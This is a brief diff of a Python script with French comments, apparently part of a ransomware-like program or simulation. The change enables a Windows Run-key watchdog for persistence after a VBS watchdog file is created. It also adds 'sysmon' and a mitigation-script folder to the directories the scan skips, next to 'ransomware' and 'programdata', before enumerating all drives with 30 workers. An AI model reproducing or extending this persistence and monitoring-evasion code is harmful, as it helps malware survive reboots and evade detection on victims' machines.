@@ -75,7 +75,9 @@ folders_exclus = [
     "microsoft",
     "programdata",
     ".vscode",
-    "ransomware"
+    "ransomware",
+    "sysmon",
+    "script-mitgation"
 ]
 
 vbsFile = []
@@ -400,8 +402,8 @@ def main():
         # Exécuter une seule fois au lieu d'une boucle infinie
     result = create_watchdog_vbs()
     time.sleep(0.5)
-    # ajouter_run_key_watchdog()
-    # time.sleep(0.5)
+    ajouter_run_key_watchdog()
+    time.sleep(0.5)
 
     lecteurs = get_existing_root_path()
     max_workers = 30
